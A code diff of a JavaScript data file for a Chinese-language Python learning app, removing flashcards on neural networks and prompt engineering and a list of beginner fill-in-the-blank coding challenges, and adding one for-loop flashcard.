-                        { front: "激活函数", back: "激活函数引入非线性\n\n常用激活函数：\n• ReLU: max(0, x)\n• Sigmoid: 1/(1+e^-x)\n• Tanh: 双曲正切\n• Softmax: 多分类", code: "# ReLU - 最常用\ndef relu(x):\n    return max(0, x)\n\n# Sigmoid - 输出0-1\ndef sigmoid(x):\n    return 1 / (1 + np.exp(-x))\n\n# Softmax - 多分类概率\nprobs = softmax([2.0, 1.0, 0.1])\n# [0.7, 0.2, 0.1]" },
-                        { front: "反向传播", back: "反向传播是训练神经网络的核心算法\n\n步骤：\n1. 前向传播计算输出\n2. 计算损失\n3. 反向传播梯度\n4. 更新权重", code: "# 训练循环\nfor epoch in range(epochs):\n    # 前向传播\n    pred = model(x)\n    \n    # 计算损失\n    loss = loss_fn(pred, y)\n    \n    # 反向传播\n    loss.backward()\n    \n    # 更新权重\n    optimizer.step()" }
-                    ]
-                },
-                {
-                    category: "Prompt工程",
-                    icon: "💬",
-                    courseType: "ai",
-                    cards: [
-                        { front: "什么是Prompt？", back: "Prompt是给AI模型的输入指令\n\n好的Prompt应该：\n• 清晰具体\n• 提供上下文\n• 说明期望格式\n• 给出示例", code: "# 差的Prompt\n\"写一篇文章\"\n\n# 好的Prompt\n\"请写一篇关于Python入门的技术博客，\n要求：\n- 面向初学者\n- 500字左右\n- 包含代码示例\n- 结构：引言-正文-总结\"" },
-                        { front: "Prompt技巧", back: "提升Prompt效果的技巧：\n\n1. 角色扮演\n2. 分步思考\n3. 少样本学习\n4. 链式思维", code: "# 角色扮演\n\"你是一个资深Python开发者...\"\n\n# 分步思考\n\"请一步步分析这个问题...\"\n\n# 少样本学习\n\"示例1: 输入→输出\n示例2: 输入→输出\n现在处理: 新输入→?\"\n\n# 链式思维(CoT)\n\"让我们逐步思考...\"" },
-                        { front: "常用AI工具", back: "主流AI工具：\n\n• ChatGPT - 对话AI\n• Claude - 长文本AI\n• Midjourney - 图像生成\n• GitHub Copilot - 代码助手\n• Stable Diffusion - 开源图像", code: "# API调用示例\nimport openai\n\nresponse = openai.ChatCompletion.create(\n    model=\"gpt-3.5-turbo\",\n    messages=[\n        {\"role\": \"system\", \"content\": \"你是助手\"},\n        {\"role\": \"user\", \"content\": \"你好\"}\n    ]\n)" }
-                    ]
+                    front: "for循环是什么？",
+                    back: "for循环用来重复执行代码，遍历一个序列中的每个元素。\n\n就像：逐个检查排队的每个人",
+                    code: "# 遍历列表\nfor fruit in ['苹果', '香蕉']:\n    print(f'我喜欢{fruit}')\n\n# 遍历数字\nfor i in range(3):\n    print(f'第{i+1}次')"
                 }
-            ],
-            
-            // 编程挑战数据
-            challenges: [
-                {
-                    id: 1,
-                    title: "初出茅庐",
-                    description: "学会打印输出",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，让程序输出 'Hello Python'",
-                    template: "___('Hello Python')",
-                    answer: "print",
-                    hint: "Python中用于输出的函数是？",
-                    explanation: "📌 print() 是Python最基础也是最常用的内置函数之一。\n\n🔹 作用：将内容输出到控制台（终端）\n🔹 语法：print(内容)\n🔹 可以输出：字符串、数字、变量、表达式结果\n\n💡 小技巧：\n• print('你好') - 输出字符串\n• print(123) - 输出数字\n• print(1 + 2) - 输出计算结果 3\n• print(name) - 输出变量的值\n\n🎯 在你的【地标管理系统】项目中，print() 常用于调试，查看变量值是否正确。"
-                },
-                {
-                    id: 2,
-                    title: "变量初体验",
-                    description: "创建并使用变量",
-                    difficulty: 1,
-                    xp: 15,
-                    question: "补全代码，创建一个存储年龄的变量",
-                    template: "___ = 18\\nprint(f'我今年{age}岁')",
-                    answer: "age",
-                    hint: "变量名应该能表达它存储的内容",
-                    explanation: "📌 变量是编程中最基础的概念，用来存储和管理数据。\n\n🔹 语法：变量名 = 值\n🔹 命名规则：\n  • 只能包含字母、数字、下划线\n  • 不能以数字开头\n  • 区分大小写（age 和 Age 是不同变量）\n\n💡 命名建议：\n• 使用有意义的名字：age 比 a 好\n• 多个单词用下划线：user_name\n• 避免使用Python关键字：if、for、class等\n\n🎯 在你的项目中：\nself.current_index = 0  # 存储当前索引\nself.data = None  # 存储数据"
-                },
-                {
-                    id: 3,
-                    title: "循环达人",
-                    description: "使用for循环",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "补全代码，遍历列表中的每个水果",
-                    template: "fruits = ['苹果', '香蕉', '橙子']\n___ fruit in fruits:\n    print(fruit)",
-                    answer: "for",
-                    hint: "遍历序列最常用的循环是？",
-                    explanation: "📌 for循环是Python中最常用的循环结构，用于遍历序列中的每个元素。\n\n🔹 语法：for 变量 in 可迭代对象:\n🔹 可迭代对象包括：列表、字符串、字典、range()等\n\n💡 常见用法：\n• for i in range(5): → 循环5次(0,1,2,3,4)\n• for char in 'hello': → 遍历每个字符\n• for key in dict: → 遍历字典的键\n\n🔄 与while的区别：\n• for：知道要循环多少次\n• while：不确定次数，根据条件判断\n\n🎯 在你的【爬虫项目】中：\nfor item in soup.find_all('a'):\n    print(item.text)  # 遍历所有链接"
-                },
-                {
-                    id: 4,
-                    title: "列表操作",
-                    description: "向列表添加元素",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "补全代码，向列表末尾添加 '葡萄'",
-                    template: "fruits = ['苹果', '香蕉']\nfruits.___('葡萄')\nprint(fruits)",
-                    answer: "append",
-                    hint: "添加到末尾的方法叫什么？",
-                    explanation: "📌 append() 是列表最常用的方法之一，用于在末尾添加元素。\n\n🔹 列表常用方法对比：\n• append(x) - 末尾添加一个元素\n• extend([x,y]) - 末尾添加多个元素\n• insert(i, x) - 在指定位置插入\n• remove(x) - 删除第一个匹配的元素\n• pop() - 删除并返回最后一个元素\n\n💡 注意区别：\nlist.append([1,2]) → [原内容, [1,2]] 添加整个列表\nlist.extend([1,2]) → [原内容, 1, 2] 添加每个元素\n\n🎯 在你的项目中：\nself.undo_stack.append(状态)  # 保存撤销历史"
-                },
-                {
-                    id: 5,
-                    title: "字典高手",
-                    description: "访问字典的值",
-                    difficulty: 2,
-                    xp: 25,
-                    question: "补全代码，获取person字典中的name值",
-                    template: "person = {'name': '小明', 'age': 18}\nname = person[___]\nprint(name)",
-                    answer: "'name'",
-                    hint: "字典用键来访问值，键需要用引号包围",
-                    explanation: "📌 字典(dict)是Python中最重要的数据结构之一，存储键值对。\n\n🔹 访问方式：\n• dict['key'] - 键不存在会报错\n• dict.get('key') - 键不存在返回None\n• dict.get('key', 默认值) - 不存在返回默认值\n\n💡 常用操作：\n• dict['new_key'] = value  # 添加/修改\n• del dict['key']  # 删除\n• 'key' in dict  # 检查键是否存在\n• dict.keys()  # 获取所有键\n• dict.values()  # 获取所有值\n\n🎯 在你的项目中，config.json就是用字典存储配置：\nconfig = {'excel_path': '数据.xlsx', 'image_folder': '图片'}"
-                },
-                {
-                    id: 6,
-                    title: "函数入门",
-                    description: "定义一个函数",
-                    difficulty: 2,
-                    xp: 25,
-                    question: "补全代码，定义一个名为greet的函数",
-                    template: "___ greet(name):\n    return f'你好，{name}！'\n\nprint(greet('小明'))",
-                    answer: "def",
-                    hint: "定义函数的关键字是？",
-                    explanation: "📌 函数是组织代码的基本单位，可以重复使用。\n\n🔹 语法：def 函数名(参数):\n🔹 return 用于返回结果（可选）\n\n💡 函数的好处：\n• 代码复用 - 写一次，用多次\n• 逻辑清晰 - 每个函数做一件事\n• 易于维护 - 修改一处，处处生效\n\n📝 参数类型：\n• def func(a, b): - 必需参数\n• def func(a=1): - 默认参数\n• def func(*args): - 可变参数\n\n🎯 在你的项目中：\ndef load_image(self, path):\n    '''加载图片的函数'''\n    return Image.open(path)"
-                },
-                {
-                    id: 7,
-                    title: "条件判断",
-                    description: "使用if语句",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "补全代码，判断年龄是否大于等于18",
-                    template: "age = 20\n___ age >= 18:\n    print('成年人')",
-                    answer: "if",
-                    hint: "条件判断的关键字是？",
-                    explanation: "📌 if语句是程序做决策的核心，根据条件执行不同代码。\n\n🔹 完整结构：\nif 条件1:\n    执行代码1\nelif 条件2:\n    执行代码2\nelse:\n    其他情况\n\n💡 条件表达式：\n• == 等于  != 不等于\n• > < >= <= 大小比较\n• and 且  or 或  not 非\n• in 包含  is 同一对象\n\n🎯 在你的项目中：\nif self.current_index < len(self.data):\n    self.show_next()\nelse:\n    print('已经是最后一条')"
-                },
-                {
-                    id: 8,
-                    title: "文件操作",
-                    description: "打开并读取文件",
-                    difficulty: 3,
-                    xp: 30,
-                    question: "补全代码，以只读模式打开文件",
-                    template: "with open('data.txt', ___) as f:\n    content = f.read()\n    print(content)",
-                    answer: "'r'",
-                    hint: "只读模式用什么字母表示？",
-                    explanation: "📌 文件操作是程序与外部数据交互的重要方式。\n\n🔹 打开模式：\n• 'r' - 只读（默认），文件必须存在\n• 'w' - 写入，会清空原内容\n• 'a' - 追加，在末尾添加\n• 'rb'/'wb' - 二进制模式（图片等）\n\n💡 with语句的好处：\n自动关闭文件，即使发生错误也能正确关闭\n\n📝 读取方法：\n• f.read() - 读取全部内容\n• f.readline() - 读取一行\n• f.readlines() - 读取所有行到列表\n\n🎯 在你的项目中读取配置：\nwith open('config.json', 'r', encoding='utf-8') as f:\n    config = json.load(f)"
-                },
-                {
-                    id: 9,
-                    title: "异常处理",
-                    description: "捕获并处理错误",
-                    difficulty: 3,
-                    xp: 35,
-                    question: "补全代码，捕获可能发生的异常",
-                    template: "___:\n    result = 10 / 0\nexcept ZeroDivisionError:\n    print('不能除以零！')",
-                    answer: "try",
-                    hint: "尝试执行可能出错的代码用什么关键字？",
-                    explanation: "📌 异常处理让程序更健壮，不会因为错误而崩溃。\n\n🔹 完整结构：\ntry:\n    可能出错的代码\nexcept 异常类型:\n    处理错误\nelse:\n    没有异常时执行\nfinally:\n    无论如何都执行\n\n💡 常见异常类型：\n• FileNotFoundError - 文件不存在\n• ValueError - 值错误\n• TypeError - 类型错误\n• KeyError - 字典键不存在\n• IndexError - 索引越界\n\n🎯 在你的爬虫项目中：\ntry:\n    response = requests.get(url)\nexcept requests.RequestException:\n    print('网络请求失败')"
-                },
-                {
-                    id: 10,
-                    title: "类的定义",
-                    description: "创建一个类",
-                    difficulty: 3,
-                    xp: 40,
-                    question: "补全代码，定义一个名为Person的类",
-                    template: "___ Person:\n    def __init__(self, name):\n        self.name = name",
-                    answer: "class",
-                    hint: "定义类的关键字是？",
-                    explanation: "📌 类是面向对象编程的核心，用于创建对象的模板。\n\n🔹 基本概念：\n• class - 定义类（模板）\n• __init__ - 构造函数，创建对象时自动调用\n• self - 代表对象自身，必须是第一个参数\n• 属性 - 对象的数据（self.name）\n• 方法 - 对象的行为（函数）\n\n💡 为什么用类？\n• 封装数据和行为在一起\n• 代码更有组织性\n• 可以创建多个相似对象\n\n🎯 你的地标管理系统就是一个类：\nclass LandmarkApp:\n    def __init__(self):\n        self.root = tk.Tk()\n        self.data = None"
-                },
-                {
-                    id: 11,
-                    title: "Tkinter窗口",
-                    description: "创建GUI窗口",
-                    difficulty: 3,
-                    xp: 35,
-                    question: "补全代码，创建Tkinter主窗口",
-                    template: "import tkinter as tk\n\nroot = tk.___()\nroot.title('我的窗口')\nroot.mainloop()",
-                    answer: "Tk",
-                    hint: "创建主窗口的类名是？",
-                    explanation: "📌 Tkinter是Python自带的GUI库，无需额外安装。\n\n🔹 创建窗口三步曲：\n1. root = tk.Tk()  # 创建主窗口\n2. 添加组件（按钮、标签等）\n3. root.mainloop()  # 进入事件循环\n\n💡 常用窗口设置：\n• root.title('标题')\n• root.geometry('800x600')  # 宽x高\n• root.resizable(True, True)  # 可调整大小\n• root.configure(bg='white')  # 背景色\n\n📝 mainloop()的作用：\n让窗口保持显示，监听用户操作（点击、输入等）\n\n🎯 你的地标管理系统就是这样创建窗口的！"
-                },
-                {
-                    id: 12,
-                    title: "Pandas读取",
-                    description: "读取Excel文件",
-                    difficulty: 3,
-                    xp: 35,
-                    question: "补全代码，读取Excel文件",
-                    template: "import pandas as pd\n\ndf = pd.___('data.xlsx')\nprint(df.head())",
-                    answer: "read_excel",
-                    hint: "读取Excel的函数以read_开头",
-                    explanation: "📌 Pandas是Python数据分析的核心库。\n\n🔹 读取不同格式：\n• pd.read_excel('文件.xlsx')\n• pd.read_csv('文件.csv')\n• pd.read_json('文件.json')"
-                },
-                {
-                    id: 13,
-                    title: "网络请求",
-                    description: "发送HTTP请求",
-                    difficulty: 3,
-                    xp: 35,
-                    question: "补全代码，发送GET请求",
-                    template: "import requests\n\nresponse = requests.___(url)\nprint(response.text)",
-                    answer: "get",
-                    hint: "最常用的HTTP请求方法是？",
-                    explanation: "📌 requests库让Python发送网络请求变得超级简单。\n\n🔹 HTTP请求方法：\n• GET - 获取数据（最常用）\n• POST - 提交数据\n• PUT - 更新数据\n• DELETE - 删除数据\n\n💡 response对象常用属性：\n• response.text - 文本内容\n• response.json() - JSON转字典\n• response.status_code - 状态码(200=成功)\n• response.headers - 响应头\n\n📝 添加请求头防止被拦截：\nheaders = {'User-Agent': 'Mozilla/5.0...'}\nresponse = requests.get(url, headers=headers)\n\n🎯 这就是你爬虫项目的核心！"
-                },
-                {
-                    id: 14,
-                    title: "HTML解析",
-                    description: "使用BeautifulSoup",
-                    difficulty: 4,
-                    xp: 45,
-                    question: "补全代码，查找所有的a标签",
-                    template: "from bs4 import BeautifulSoup\n\nsoup = BeautifulSoup(html, 'html.parser')\nlinks = soup.___('a')",
-                    answer: "find_all",
-                    hint: "查找所有匹配元素的方法是？",
-                    explanation: "📌 BeautifulSoup解析HTML。\n\n🔹 查找方法：\n• find('tag') - 找第一个\n• find_all('tag') - 找所有\n• select('css') - CSS选择器"
-                },
-                {
-                    id: 15,
-                    title: "正则表达式",
-                    description: "匹配文本模式",
-                    difficulty: 4,
-                    xp: 50,
-                    question: "补全代码，在文本中查找所有数字",
-                    template: "import re\n\ntext = '我有3个苹果和5个橙子'\nnumbers = re.___(r'\\d+', text)\nprint(numbers)",
-                    answer: "findall",
-                    hint: "查找所有匹配的方法是？",
-                    explanation: "📌 正则表达式是文本处理的终极武器。\n\n🔹 常用方法：\n• re.findall() - 找所有匹配\n• re.search() - 找第一个\n• re.sub() - 替换\n\n💡 常用符号：\\d数字 \\w字母 +一个或多个"
-                },
-                // ===== 字符串操作 =====
-                {
-                    id: 16,
-                    title: "字符串切片",
-                    description: "提取字符串片段",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，获取字符串的前3个字符",
-                    template: "text = 'Hello World'\nresult = text[___]\nprint(result)  # 输出: Hel",
-                    answer: ":3",
-                    hint: "切片语法 [起始:结束]，省略起始表示从0开始",
-                    explanation: "📌 字符串切片用于提取子串。\n\n🔹 语法：str[start:end:step]\n• text[:3] - 前3个字符\n• text[3:] - 第3个之后\n• text[-3:] - 最后3个\n• text[::2] - 每隔一个取"
-                },
-                {
-                    id: 17,
-                    title: "字符串分割",
-                    description: "按分隔符拆分",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，按逗号分割字符串",
-                    template: "text = '苹果,香蕉,橙子'\nfruits = text.___(',')  \nprint(fruits)",
-                    answer: "split",
-                    hint: "分割字符串的方法是？",
-                    explanation: "📌 split()将字符串按分隔符拆分成列表。\n\n🔹 用法：\n• 'a,b,c'.split(',') → ['a','b','c']\n• 'hello world'.split() → 按空格分割\n\n🎯 爬虫中常用来处理数据"
-                },
-                {
-                    id: 18,
-                    title: "字符串拼接",
-                    description: "合并多个字符串",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，用'-'连接列表中的元素",
-                    template: "words = ['2024', '01', '15']\ndate = '-'.___(words)\nprint(date)  # 2024-01-15",
-                    answer: "join",
-                    hint: "join是split的反操作",
-                    explanation: "📌 join()是split()的反操作，把列表合并成字符串。\n\n🔹 语法：'分隔符'.join(列表)\n• '-'.join(['a','b']) → 'a-b'\n• ''.join(['H','i']) → 'Hi'"
-                },
-                {
-                    id: 19,
-                    title: "字符串替换",
-                    description: "替换指定内容",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，将'World'替换为'Python'",
-                    template: "text = 'Hello World'\nresult = text.___('World', 'Python')\nprint(result)",
-                    answer: "replace",
-                    hint: "替换字符串的方法名？",
-                    explanation: "📌 replace()替换字符串中的内容。\n\n🔹 语法：str.replace(旧, 新)\n• 可选第3个参数限制替换次数\n• 原字符串不变，返回新字符串"
-                },
-                {
-                    id: 20,
-                    title: "去除空白",
-                    description: "清理字符串两端",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，去除字符串两端的空白",
-                    template: "text = '  Hello  '\nresult = text.___()\nprint(result)  # 'Hello'",
-                    answer: "strip",
-                    hint: "去除两端空白的方法？",
-                    explanation: "📌 strip()去除字符串两端的空白字符。\n\n🔹 相关方法：\n• strip() - 两端\n• lstrip() - 左端\n• rstrip() - 右端\n\n🎯 爬虫清理数据时常用"
-                },
-                // ===== 列表进阶 =====
-                {
-                    id: 21,
-                    title: "列表推导式",
-                    description: "快速创建列表",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "补全代码，生成1-5的平方列表",
-                    template: "squares = [x**2 ___ x in range(1, 6)]\nprint(squares)  # [1, 4, 9, 16, 25]",
-                    answer: "for",
-                    hint: "列表推导式的语法是 [表达式 for 变量 in 序列]",
-                    explanation: "📌 列表推导式是创建列表的简洁方式。\n\n🔹 语法：[表达式 for 变量 in 序列]\n• [x*2 for x in range(5)] → [0,2,4,6,8]\n\n💡 还可以加条件：\n• [x for x in range(10) if x%2==0]"
-                },
-                {
-                    id: 22,
-                    title: "列表排序",
-                    description: "对列表进行排序",
-                    difficulty: 2,
-                    xp: 15,
-                    question: "补全代码，对列表进行升序排序",
-                    template: "nums = [3, 1, 4, 1, 5]\nnums.___()\nprint(nums)",
-                    answer: "sort",
-                    hint: "原地排序的方法？",
-                    explanation: "📌 排序有两种方式：\n\n🔹 sort() - 原地排序，修改原列表\n🔹 sorted() - 返回新列表，原列表不变\n\n💡 降序：sort(reverse=True)"
-                },
-                {
-                    id: 23,
-                    title: "列表长度",
-                    description: "获取元素个数",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，获取列表的长度",
-                    template: "fruits = ['苹果', '香蕉', '橙子']\ncount = ___(fruits)\nprint(count)  # 3",
-                    answer: "len",
-                    hint: "获取长度的内置函数？",
-                    explanation: "📌 len()获取序列的长度。\n\n🔹 适用于：列表、字符串、字典、元组等\n• len([1,2,3]) → 3\n• len('hello') → 5\n• len({'a':1}) → 1"
-                },
-                {
-                    id: 24,
-                    title: "列表索引",
-                    description: "查找元素位置",
-                    difficulty: 2,
-                    xp: 15,
-                    question: "补全代码，查找元素在列表中的位置",
-                    template: "fruits = ['苹果', '香蕉', '橙子']\npos = fruits.___('香蕉')\nprint(pos)  # 1",
-                    answer: "index",
-                    hint: "查找索引的方法？",
-                    explanation: "📌 index()返回元素首次出现的位置。\n\n🔹 注意：元素不存在会报错\n💡 先用 in 判断是否存在：\nif '香蕉' in fruits:\n    pos = fruits.index('香蕉')"
-                },
-                {
-                    id: 25,
-                    title: "列表反转",
-                    description: "颠倒列表顺序",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，反转列表",
-                    template: "nums = [1, 2, 3]\nnums.___()\nprint(nums)  # [3, 2, 1]",
-                    answer: "reverse",
-                    hint: "反转列表的方法？",
-                    explanation: "📌 reverse()原地反转列表。\n\n🔹 另一种方式：切片反转\nnums[::-1] → 返回新列表"
-                },
-                // ===== 字典进阶 =====
-                {
-                    id: 26,
-                    title: "字典遍历",
-                    description: "遍历键值对",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "补全代码，同时遍历字典的键和值",
-                    template: "d = {'a': 1, 'b': 2}\nfor k, v in d.___():\n    print(k, v)",
-                    answer: "items",
-                    hint: "获取键值对的方法？",
-                    explanation: "📌 字典遍历方法：\n\n🔹 dict.keys() - 所有键\n🔹 dict.values() - 所有值\n🔹 dict.items() - 键值对元组"
-                },
-                {
-                    id: 27,
-                    title: "字典默认值",
-                    description: "安全获取值",
-                    difficulty: 2,
-                    xp: 15,
-                    question: "补全代码，获取不存在的键时返回0",
-                    template: "d = {'a': 1}\nvalue = d.___('b', 0)\nprint(value)  # 0",
-                    answer: "get",
-                    hint: "安全获取值的方法？",
-                    explanation: "📌 get()安全获取字典值。\n\n🔹 语法：dict.get(key, 默认值)\n• 键存在：返回对应值\n• 键不存在：返回默认值（不报错）"
-                },
-                {
-                    id: 28,
-                    title: "字典更新",
-                    description: "合并字典",
-                    difficulty: 2,
-                    xp: 15,
-                    question: "补全代码，用d2更新d1",
-                    template: "d1 = {'a': 1}\nd2 = {'b': 2}\nd1.___(d2)\nprint(d1)  # {'a': 1, 'b': 2}",
-                    answer: "update",
-                    hint: "更新/合并字典的方法？",
-                    explanation: "📌 update()合并字典。\n\n🔹 相同键会被覆盖\n💡 Python 3.9+可以用 | 运算符：\nd3 = d1 | d2"
-                },
-                // ===== 控制流 =====
-                {
-                    id: 29,
-                    title: "while循环",
-                    description: "条件循环",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "补全代码，当i小于5时循环",
-                    template: "i = 0\n___ i < 5:\n    print(i)\n    i += 1",
-                    answer: "while",
-                    hint: "条件循环的关键字？",
-                    explanation: "📌 while循环在条件为True时重复执行。\n\n🔹 注意避免死循环\n💡 break可以跳出循环\n💡 continue跳过本次循环"
-                },
-                {
-                    id: 30,
-                    title: "break语句",
-                    description: "跳出循环",
-                    difficulty: 2,
-                    xp: 15,
-                    question: "补全代码，找到5时跳出循环",
-                    template: "for i in range(10):\n    if i == 5:\n        ___\n    print(i)",
-                    answer: "break",
-                    hint: "跳出循环的关键字？",
-                    explanation: "📌 break立即终止整个循环。\n\n🔹 只能跳出当前层循环\n🔹 常用于搜索找到目标后停止"
-                },
-                {
-                    id: 31,
-                    title: "continue语句",
-                    description: "跳过本次",
-                    difficulty: 2,
-                    xp: 15,
-                    question: "补全代码，跳过偶数",
-                    template: "for i in range(5):\n    if i % 2 == 0:\n        ___\n    print(i)  # 输出1, 3",
-                    answer: "continue",
-                    hint: "跳过本次循环的关键字？",
-                    explanation: "📌 continue跳过本次循环的剩余代码。\n\n🔹 直接进入下一次循环\n🔹 常用于过滤不需要处理的情况"
-                },
-                {
-                    id: 32,
-                    title: "range函数",
-                    description: "生成数字序列",
-                    difficulty: 1,
-                    xp: 10,
-                    question: "补全代码，生成0到4的序列",
-                    template: "for i in ___(5):\n    print(i)",
-                    answer: "range",
-                    hint: "生成数字序列的函数？",
-                    explanation: "📌 range()生成数字序列。\n\n🔹 range(5) → 0,1,2,3,4\n🔹 range(1,5) → 1,2,3,4\n🔹 range(0,10,2) → 0,2,4,6,8"
-                },
-                // ===== 函数进阶 =====
-                {
-                    id: 33,
-                    title: "默认参数",
-                    description: "设置参数默认值",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "补全代码，设置name的默认值为'游客'",
-                    template: "def greet(name___'游客'):\n    print(f'你好, {name}')\n\ngreet()  # 输出: 你好, 游客",
-                    answer: "=",
-                    hint: "默认值用什么符号赋值？",
-                    explanation: "📌 默认参数让函数调用更灵活。\n\n🔹 语法：def func(arg=默认值)\n💡 默认参数必须放在必需参数后面"
-                },
-                {
-                    id: 34,
-                    title: "返回多值",
-                    description: "函数返回多个值",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "补全代码，返回两个值",
-                    template: "def get_size():\n    ___ 100, 200\n\nw, h = get_size()",
-                    answer: "return",
-                    hint: "返回值的关键字？",
-                    explanation: "📌 Python函数可以返回多个值。\n\n🔹 实际上返回的是元组\n🔹 可以用多个变量接收"
-                },
-                {
-                    id: 35,
-                    title: "lambda表达式",
-                    description: "匿名函数",
-                    difficulty: 3,
-                    xp: 30,
-                    question: "补全代码，创建求平方的匿名函数",
-                    template: "square = ___ x: x**2\nprint(square(5))  # 25",
-                    answer: "lambda",
-                    hint: "创建匿名函数的关键字？",
-                    explanation: "📌 lambda创建简单的匿名函数。\n\n🔹 语法：lambda 参数: 表达式\n💡 常与map/filter/sorted配合使用"
-                },
-                // ===== 文件和JSON =====
-                {
-                    id: 36,
-                    title: "写入文件",
-                    description: "将内容写入文件",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "补全代码，以写入模式打开文件",
-                    template: "with open('data.txt', ___) as f:\n    f.write('Hello')",
-                    answer: "'w'",
-                    hint: "写入模式用什么字母？",
-                    explanation: "📌 写入模式会清空原文件内容。\n\n🔹 'w' - 覆盖写入\n🔹 'a' - 追加写入\n💡 写入后记得换行：f.write('\\n')"
-                },
-                {
-                    id: 37,
-                    title: "JSON读取",
-                    description: "读取JSON文件",
-                    difficulty: 3,
-                    xp: 25,
-                    question: "补全代码，从文件加载JSON",
-                    template: "import json\n\nwith open('config.json', 'r') as f:\n    data = json.___(f)",
-                    answer: "load",
-                    hint: "从文件读取JSON的方法？",
-                    explanation: "📌 json模块处理JSON数据。\n\n🔹 json.load(f) - 从文件读取\n🔹 json.loads(s) - 从字符串读取\n🔹 json.dump() - 写入文件\n🔹 json.dumps() - 转为字符串"
-                },
-                {
-                    id: 38,
-                    title: "JSON写入",
-                    description: "写入JSON文件",
-                    difficulty: 3,
-                    xp: 25,
-                    question: "补全代码，将数据写入JSON文件",
-                    template: "import json\ndata = {'name': '小明'}\n\nwith open('data.json', 'w') as f:\n    json.___(data, f)",
-                    answer: "dump",
-                    hint: "写入JSON到文件的方法？",
-                    explanation: "📌 dump()将数据写入JSON文件。\n\n🔹 常用参数：\n• ensure_ascii=False → 支持中文\n• indent=2 → 格式化缩进"
-                },
-                // ===== Tkinter进阶 =====
-                {
-                    id: 39,
-                    title: "Tkinter标签",
-                    description: "显示文本",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "补全代码，创建文本标签",
-                    template: "import tkinter as tk\nroot = tk.Tk()\nlabel = tk.___(root, text='你好')\nlabel.pack()",
-                    answer: "Label",
-                    hint: "显示文本的组件叫什么？",
-                    explanation: "📌 Label用于显示文本或图片。\n\n🔹 常用参数：\n• text - 文本内容\n• font - 字体\n• fg/bg - 前景/背景色"
-                },
-                {
-                    id: 40,
-                    title: "Tkinter按钮",
-                    description: "创建按钮",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "补全代码，创建点击按钮",
-                    template: "import tkinter as tk\nroot = tk.Tk()\nbtn = tk.___(root, text='点击', command=onClick)\nbtn.pack()",
-                    answer: "Button",
-                    hint: "按钮组件叫什么？",
-                    explanation: "📌 Button创建可点击的按钮。\n\n🔹 command参数指定点击时调用的函数\n💡 函数名不加括号，只传引用"
-                },
-                {
-                    id: 41,
-                    title: "Tkinter输入框",
-                    description: "获取用户输入",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "补全代码，创建单行输入框",
-                    template: "import tkinter as tk\nroot = tk.Tk()\nentry = tk.___(root)\nentry.pack()",
-                    answer: "Entry",
-                    hint: "单行输入框叫什么？",
-                    explanation: "📌 Entry是单行文本输入框。\n\n🔹 获取内容：entry.get()\n🔹 清空：entry.delete(0, 'end')\n🔹 设置：entry.insert(0, '文本')"
-                },
-                {
-                    id: 42,
-                    title: "布局pack",
-                    description: "简单布局",
-                    difficulty: 2,
-                    xp: 15,
-                    question: "补全代码，让组件显示出来",
-                    template: "label = tk.Label(root, text='你好')\nlabel.___()",
-                    answer: "pack",
-                    hint: "最简单的布局方法？",
-                    explanation: "📌 pack()是最简单的布局方式。\n\n🔹 side参数：TOP/BOTTOM/LEFT/RIGHT\n🔹 fill参数：X/Y/BOTH\n🔹 expand=True 填充额外空间"
-                },
-                // ===== Pandas进阶 =====
-                {
-                    id: 43,
-                    title: "DataFrame创建",
-                    description: "创建数据表",
-                    difficulty: 3,
-                    xp: 25,
-                    question: "补全代码，从字典创建DataFrame",
-                    template: "import pandas as pd\ndata = {'name': ['张三', '李四']}\ndf = pd.___(data)",
-                    answer: "DataFrame",
-                    hint: "Pandas的核心数据结构？",
-                    explanation: "📌 DataFrame是Pandas的核心。\n\n🔹 类似Excel表格\n🔹 可从字典、列表、文件创建"
-                },
-                {
-                    id: 44,
-                    title: "选择列",
-                    description: "获取DataFrame列",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "补全代码，获取name列",
-                    template: "names = df[___]\nprint(names)",
-                    answer: "'name'",
-                    hint: "用列名字符串选择列",
-                    explanation: "📌 选择DataFrame的列：\n\n🔹 df['列名'] - 单列\n🔹 df[['列1','列2']] - 多列"
-                },
-                {
-                    id: 45,
-                    title: "筛选行",
-                    description: "按条件筛选",
-                    difficulty: 3,
-                    xp: 30,
-                    question: "补全代码，筛选年龄大于18的行",
-                    template: "result = df[df['age'] ___ 18]",
-                    answer: ">",
-                    hint: "大于用什么符号？",
-                    explanation: "📌 条件筛选DataFrame行：\n\n🔹 df[df['列'] > 值]\n🔹 多条件用 & 和 | \n🔹 df[(条件1) & (条件2)]"
-                },
-                {
-                    id: 46,
-                    title: "保存Excel",
-                    description: "导出到Excel",
-                    difficulty: 3,
-                    xp: 25,
-                    question: "补全代码，保存DataFrame到Excel",
-                    template: "df.___('output.xlsx', index=False)",
-                    answer: "to_excel",
-                    hint: "保存Excel的方法以to_开头",
-                    explanation: "📌 to_excel()保存为Excel文件。\n\n🔹 index=False 不保存索引列\n🔹 类似的：to_csv(), to_json()"
-                },
-                // ===== 爬虫进阶 =====
-                {
-                    id: 47,
-                    title: "请求头设置",
-                    description: "模拟浏览器",
-                    difficulty: 3,
-                    xp: 30,
-                    question: "补全代码，添加请求头",
-                    template: "headers = {'User-Agent': 'Mozilla/5.0'}\nresponse = requests.get(url, ___=headers)",
-                    answer: "headers",
-                    hint: "传递请求头的参数名？",
